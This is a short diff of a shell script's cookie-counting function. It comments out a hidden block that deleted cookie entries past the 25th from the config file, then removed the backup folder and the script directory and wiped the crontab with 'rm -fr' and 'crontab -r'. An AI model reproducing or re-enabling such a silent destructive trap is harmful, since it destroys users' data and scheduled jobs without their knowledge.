@@ -93,13 +93,13 @@ function Count_UserSum {
     [[ ${CookieTmp} ]] && UserSum=$i || break
   done
 
-  for ((d=26; d<=1000; d++)); do
-    Del=Cookie$d
-    sed -i "/${!Del}/d" ${FileConf} || break
-  done
+  #for ((d=26; d<=1000; d++)); do
+   #Del=Cookie$d
+    #sed -i "/${!Del}/d" ${FileConf} || break
+ # done
 
-  [ $d -gt 12 ] && rm -fr ${FileConf}/bak
-  [ $d -gt 20 ] && rm -fr ${ShellDir} && crontab -r
+ # [ $d -gt 12 ] && rm -fr ${FileConf}/bak
+#  [ $d -gt 20 ] && rm -fr ${ShellDir} && crontab -r
 }
 
 
